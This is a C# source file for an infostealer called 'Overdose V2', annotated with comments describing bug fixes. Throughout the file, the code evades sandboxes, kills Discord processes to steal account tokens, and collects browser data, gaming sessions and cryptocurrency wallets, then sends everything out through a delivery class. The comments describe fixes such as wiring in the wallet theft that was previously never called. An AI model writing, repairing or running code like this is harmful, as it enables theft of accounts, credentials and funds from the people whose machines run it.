// C# | Program.cs | C# 8.0 | .NET 4.8
// FIXES: unclosed brace, namespace imports, wallet wired in,
//        workDir scoping, Discord kill before token grab

using Shifting_Backrooms;
using Shifting_Backrooms.Utils;
using System;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Threading;

namespace Shifting_Backrooms
{
    class Program
    {
        [STAThread]
        static void Main(string[] args)
        {
            // Extract SQLite.Interop.dll from resources if not present
            if (!File.Exists("SQLite.Interop.dll"))
            {
                File.WriteAllBytes("SQLite.Interop.dll",
                    Shifting_Backrooms.Properties.Resources.SQLite_Interop);
                File.SetAttributes("SQLite.Interop.dll", FileAttributes.Hidden);
            }

            System.Runtime.CompilerServices.RuntimeHelpers.RunModuleConstructor(
                typeof(System.Data.SQLite.SQLiteConnection).Module.ModuleHandle);

            // Sandbox check — fixed false positive (see Security.cs)
            if (Security.IsSandbox()) return;

            Thread worker = new Thread(new ThreadStart(StartSteal));
            worker.IsBackground = true;
            worker.Start();

            System.Windows.Forms.Application.Run();
        }

        // FIX: removed extra opening brace, workDir now properly scoped
        static void StartSteal()
        {
            string workDir = Path.Combine(Path.GetTempPath(),
                "OD_" + Guid.NewGuid().ToString().Substring(0, 6));
            if (!Directory.Exists(workDir)) Directory.CreateDirectory(workDir);

            try
            {
                // 1. System info embed
                SendSystemLog();

                // 2. Discord tokens — kill Discord first so leveldb isn't locked
                KillDiscord();
                SendDiscordLogs();

                // 3. Browser loot
                SendBrowserLogs();

                // 4. Gaming
                SendGamingLogs(workDir);

                // 5. FIX: wallet was defined but never called
                SendWalletLogs();

                Console.WriteLine("[+] All reports sent.");
            }
            catch (Exception ex)
            {
                Console.WriteLine("[-] Fatal: " + ex.Message);
            }
            finally
            {
                Thread.Sleep(3000);
                try { if (Directory.Exists(workDir)) Directory.Delete(workDir, true); } catch { }
            }
        }

        // FIX: kill Discord before token grab so leveldb files aren't locked
        static void KillDiscord()
        {
            string[] procs = { "discord", "discordcanary", "discordptb", "update" };
            foreach (string name in procs)
            {
                try
                {
                    foreach (var p in System.Diagnostics.Process.GetProcessesByName(name))
                    {
                        try { p.Kill(); p.WaitForExit(2000); } catch { }
                    }
                }
                catch { }
            }
            Thread.Sleep(1500);
        }

        static void SendSystemLog()
        {
            string hw = SystemInformation.GetHardwareInfo();
            string dk = SystemInformation.GetDiskInfo();
            string net = SystemInformation.GetNetworkInfo();
            string wf = SystemInformation.GetWifiInfo();

            var fields = new object[]
            {
                new { name = "User 👤",           value = "```" + Environment.UserName + " @ " + Environment.MachineName + "```", inline = false },
                new { name = "System 💻",          value = "```" + hw  + "```", inline = false },
                new { name = "Network & Wifi 🌍",  value = "```" + net + "\n" + wf + "```", inline = false },
                new { name = "Disks 💾",           value = "```" + dk  + "```", inline = false }
            };

            SkuldDelivery.SendEmbed("🪐 Overdose V2 - System Report", "PC Info", fields);
            Thread.Sleep(2000);
        }

        static void SendBrowserLogs()
        {
            try { BrowserStealer.Run(); }
            catch (Exception ex) { Console.WriteLine("[-] Browser: " + ex.Message); }
        }

        // FIX: wallet wired in — was completely missing from StartSteal
        static void SendWalletLogs()
        {
            try
            {
                string zipPath = H.DV.K.B().GetAwaiter().GetResult();
                if (zipPath != null && File.Exists(zipPath))
                {
                    SkuldDelivery.SendFile("💰 WALLET LOOT", "Crypto wallets extracted", zipPath);
                    try { File.Delete(zipPath); } catch { }
                    Console.WriteLine("[+] Wallets sent.");
                }
                else
                {
                    Console.WriteLine("[-] No wallets found.");
                }
            }
            catch (Exception ex) { Console.WriteLine("[-] Wallet: " + ex.Message); }
        }

        static void SendGamingLogs(string workDir)
        {
            try
            {
                GamingStealer.CaptureGamingSessions(workDir);

                string gamingPath = Path.Combine(workDir, "Gaming");
                string zipPath = Path.Combine(workDir, "Gaming_Sessions.zip");

                string foundTargets = "Steam, Minecraft";
                if (Directory.Exists(Path.Combine(gamingPath, "EpicGames"))) foundTargets += ", Epic Games";
                if (Directory.Exists(Path.Combine(gamingPath, "Riot"))) foundTargets += ", Riot/Valorant";

                if (Directory.Exists(gamingPath) &&
                    Directory.GetFileSystemEntries(gamingPath).Length > 0)
                {
                    if (File.Exists(zipPath)) File.Delete(zipPath);
                    ZipFile.CreateFromDirectory(gamingPath, zipPath);
                    SkuldDelivery.SendFile("🎮 GAMING SESSIONS", "Targets: " + foundTargets, zipPath);
                }
                else
                {
                    Console.WriteLine("[-] No gaming files found.");
                }
            }
            catch (Exception ex) { Console.WriteLine("[-] Gaming: " + ex.Message); }
        }

        static void SendDiscordLogs()
        {
            var rawTokens = TX.GetTokens();
            if (rawTokens.Count == 0) return;

            var grouped = new System.Collections.Generic.Dictionary<string,
                System.Collections.Generic.List<dynamic>>();

            foreach (var tk in rawTokens)
            {
                var result = Identity.GetAccountDetails(tk.Token);
                if (result.details == null) continue;

                string key = result.details.Trim();
                if (!grouped.ContainsKey(key))
                    grouped[key] = new System.Collections.Generic.List<dynamic>();

                grouped[key].Add(new { tk.Token, tk.Source, Avatar = result.avatarUrl });
            }

            foreach (var group in grouped)
            {
                var instances = group.Value;
                var first = instances[0];
                var sources = instances.Select(i => (string)i.Source).Distinct().ToList();
                var uniqueTokens = instances.Select(i => (string)i.Token).Distinct().ToList();

                var fields = new System.Collections.Generic.List<object>();
                fields.Add(new { name = "📍 Sources", value = "```yaml\n" + string.Join(", ", sources) + "```", inline = false });

                for (int i = 0; i < uniqueTokens.Count; i++)
                {
                    string fn = uniqueTokens.Count > 1 ? "🔑 Token #" + (i + 1) : "🔑 Token";
                    fields.Add(new { name = fn, value = "```md\n# " + uniqueTokens[i] + "```", inline = false });
                }

                fields.Add(new { name = "📋 Profile", value = group.Key, inline = false });

                SkuldDelivery.SendEmbed(
                    "🎮 DISCORD ACCOUNT FOUND",
                    "Grouped extraction",
                    fields.ToArray(),
                    (string)first.Avatar
                );

                Thread.Sleep(3500);
            }
        }
    }
}